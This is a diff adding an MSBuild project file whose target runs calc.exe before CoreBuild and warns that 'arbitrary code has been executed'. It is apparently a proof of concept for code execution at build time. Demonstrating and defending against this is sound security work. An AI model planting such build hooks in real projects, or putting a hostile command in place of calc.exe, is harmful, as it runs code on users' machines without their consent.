@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Project>
+
+	<Target Name="OpenCalc" BeforeTargets="CoreBuild">
+		<Exec Command="calc.exe" />
+		<Warning Text="Arbitrary code has been executed!"/>
+	</Target>
+</Project>
